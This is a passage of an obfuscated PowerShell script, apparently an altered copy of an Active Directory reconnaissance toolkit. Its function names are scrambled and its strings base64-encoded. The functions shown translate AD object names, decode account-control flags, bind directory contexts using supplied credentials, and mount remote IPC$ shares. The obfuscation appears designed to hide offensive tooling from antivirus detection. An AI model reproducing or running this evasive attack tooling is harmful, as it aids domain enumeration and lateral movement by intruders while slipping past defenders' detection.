                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    Default {
                        __/=\____/===\/==\ -Identity ${/=\_/==\__/==\/\_} @/==\/===\/=\_____
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBTAEkARABdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgAFMASQBEACAAJwAkAHsALwA9AFwAXwAvAD0APQBcAF8AXwAvAD0APQBcAC8AXABfAH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
}
function __/=\____/===\/==\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        ${_/=\/=\/==\/\_/=\_},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${___/\/=\_/=\/\_/=} = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }
        function __/=\/\__/===\_/=\([__ComObject] $Object, [String] $Method, ${_/=\__/\_/\/\_/==\}) {
            ${__/\/\/\_/\/\/=\/} = $Null
            ${__/\/\/\_/\/\/=\/} = $Object.GetType().InvokeMember($Method, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $NULL, $Object, ${_/=\__/\_/\/\_/==\})
            echo ${__/\/\/\_/\/\/=\/}
        }
        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, $NULL)
        }
        function __/\/\/=\/=\/\/=\_([__ComObject] $Object, [String] $Property, ${_/=\__/\_/\/\_/==\}) {
            [Void] $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, ${_/=\__/\_/\/\_/==\})
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${_/=\_/\_/==\/=\/\} = 2
            ${_/==\___/=====\__} = $Server
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${_/=\_/\_/==\/=\/\} = 1
            ${_/==\___/=====\__} = $Domain
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${_/=\/\_/\/\__/===} = $Credential.GetNetworkCredential()
            ${_/=\_/\_/==\/=\/\} = 1
            ${_/==\___/=====\__} = ${_/=\/\_/\/\__/===}.Domain
        }
        else {
            ${_/=\_/\_/==\/=\/\} = 3
            ${_/==\___/=====\__} = $Null
        }
    }
    PROCESS {
        ForEach (${___/\/=\_/=\__/\/} in $Identity) {
            if (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAVAB5AHAAZQA=')))]) {
                if (${___/\/=\_/=\__/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6AF0AKwBcAFwAWwBBAC0AWgBhAC0AegAgAF0AKwA=')))) {
                    ${___/==\/==\_/\___} = ${___/\/=\_/=\/\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))]
                }
                else {
                    ${___/==\/==\_/\___} = ${___/\/=\_/=\/\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))]
                }
            }
            else {
                ${___/==\/==\_/\___} = ${___/\/=\_/=\/\_/=}[${_/=\/=\/==\/\_/=\_}]
            }
            ${__/===\___/======} = New-Object -ComObject NameTranslate
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                try {
                    ${_/=\/\_/\/\__/===} = $Credential.GetNetworkCredential()
                    __/=\/\__/===\_/=\ ${__/===\___/======} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABFAHgA'))) (
                        ${_/=\_/\_/==\/=\/\},
                        ${_/==\___/=====\__},
                        ${_/=\/\_/\/\__/===}.UserName,
                        ${_/=\/\_/\/\__/===}.Domain,
                        ${_/=\/\_/\/\__/===}.Password
                    )
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAB1AHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgADoAIAAkAF8A')))
                }
            }
            else {
                try {
                    $Null = __/=\/\__/===\_/=\ ${__/===\___/======} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (
                        ${_/=\_/\_/==\/=\/\},
                        ${_/==\___/=====\__}
                    )
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAA6ACAAJABfAA==')))
                }
            }
            __/\/\/=\/=\/\/=\_ ${__/===\___/======} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
            try {
                $Null = __/=\/\__/===\_/=\ ${__/===\___/======} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (8, ${___/\/=\_/=\__/\/})
                __/=\/\__/===\_/=\ ${__/===\___/======} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (${___/==\/==\_/\___})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '${___/\/=\_/=\__/\/}' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function ConvertFrom-UACValue {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        ${/==\/==\/\/\___/=},
        [Switch]
        $ShowAll
    )
    BEGIN {
        ${__/=\/\/=\/\___/\} = New-Object System.Collections.Specialized.OrderedDictionary
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        ${__/=\/\/=\/\___/\}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    PROCESS {
        ${__/===\/\__/==\__} = New-Object System.Collections.Specialized.OrderedDictionary
        if ($ShowAll) {
            ForEach (${/=\_/=\/\__/==\/\} in ${__/=\/\/=\/\___/\}.GetEnumerator()) {
                if ( (${/==\/==\/\/\___/=} -band ${/=\_/=\/\__/==\/\}.Value) -eq ${/=\_/=\/\__/==\/\}.Value) {
                    ${__/===\/\__/==\__}.Add(${/=\_/=\/\__/==\/\}.Name, "$(${/=\_/=\/\__/==\/\}.Value)+")
                }
                else {
                    ${__/===\/\__/==\__}.Add(${/=\_/=\/\__/==\/\}.Name, "$(${/=\_/=\/\__/==\/\}.Value)")
                }
            }
        }
        else {
            ForEach (${/=\_/=\/\__/==\/\} in ${__/=\/\/=\/\___/\}.GetEnumerator()) {
                if ( (${/==\/==\/\/\___/=} -band ${/=\_/=\/\__/==\/\}.Value) -eq ${/=\_/=\/\__/==\/\}.Value) {
                    ${__/===\/\__/==\__}.Add(${/=\_/=\/\__/==\/\}.Name, "$(${/=\_/=\/\__/==\/\}.Value)")
                }
            }
        }
        ${__/===\/\__/==\__}
    }
}
function ___/\__/===\__/\__ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] -or ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA'))))) {
            if ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                ${_/\__/=\__/\_/===} = $Identity | __/=\____/===\/==\ -_/=\/=\/==\/\_/=\_ Canonical
                if (${_/\__/=\__/\_/===}) {
                    ${_/==\/\/==\___/=\} = ${_/\__/=\__/\_/===}.SubString(0, ${_/\__/=\__/\_/===}.IndexOf('/'))
                    ${__/\/\/\_/====\/\} = $Identity.Split('\')[1]
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJAB7AF8ALwA9AD0AXAAvAFwALwA9AD0AXABfAF8AXwAvAD0AXAB9ACcA')))
                }
            }
            else {
                ${__/\/\/\_/====\/\} = $Identity
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
                ${_/==\/\/==\___/=\} = $Domain
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${/====\/\/\______/} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${_/==\/\/==\___/=\}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${/====\/\/\______/} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${_/==\/\/==\___/=\})
            }
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${_/==\_/==\/=\__/\} = ____/\/\/=\/\/==\/ | select -ExpandProperty Name
                ${/====\/\/\______/} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${_/==\_/==\/=\__/\}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${/====\/\/\______/} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            ${__/\/\/\_/====\/\} = $Identity
        }
        ${__/\/=\/\/\/==\__} = New-Object PSObject
        ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdAA='))) ${/====\/\/\______/}
        ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))) ${__/\/\/\_/====\/\}
        ${__/\/=\/\/\/==\__}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAGIAaQBuAGQAaQBuAGcAIABmAG8AcgAgAG8AYgBqAGUAYwB0ACAAKAAnACQASQBkAGUAbgB0AGkAdAB5ACcAKQAgAGMAbwBuAHQAZQB4AHQAIAA6ACAAJABfAA==')))
    }
}
function ___/=\_/\_/=\/\_/\ {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )
    BEGIN {
        ${/=\/=\/==\/\/==\/} = [Activator]::CreateInstance(${____/\_/\______/\})
        ${/=\/=\/==\/\/==\/}.dwType = 1
    }
    PROCESS {
        ${/===\__/==\/\/===} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${___/\/\/==\_/\__/} in ${____/=\/=\_/=\/\/}) {
                ${___/\/\/==\_/\__/} = ${___/\/\/==\_/\__/}.Trim('\')
                ${/===\__/==\/\/===} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBfAF8AXwAvAFwALwBcAC8APQA9AFwAXwAvAFwAXwBfAC8AfQBcAEkAUABDACQA')))
            }
        }
        else {
            ${/===\__/==\/\/===} += ,$Path
        }
        ForEach (${/=\_/==\/===\____} in ${/===\__/==\/\/===}) {
            ${/=\/=\/==\/\/==\/}.lpRemoteName = ${/=\_/==\/===\____}
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABtAG8AdQBuAHQAOgAgACQAewAvAD0AXABfAC8APQA9AFwALwA9AD0APQBcAF8AXwBfAF8AfQA=')))
            ${/\_____/=\__/==\_} = ${/=\_/========\/\/}::WNetAddConnection2W(${/=\/=\/==\/\/==\/}, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
            if (${/\_____/=\__/==\_} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwA9AD0AXAAvAD0APQA9AFwAXwBfAF8AXwB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABtAG8AdQBuAHQAZQBkAA==')))
            }
            else {
                Throw "[Add-RemoteConnection] error mounting ${/=\_/==\/===\____} : $(([ComponentModel.Win32Exception]${/\_____/=\__/==\_}).Message)"
            }
        }
    }
}
function _______/\__/=\/=\/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        ${/===\__/==\/\/===} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${___/\/\/==\_/\__/} in ${____/=\/=\_/=\/\/}) {
                ${___/\/\/==\_/\__/} = ${___/\/\/==\_/\__/}.Trim('\')
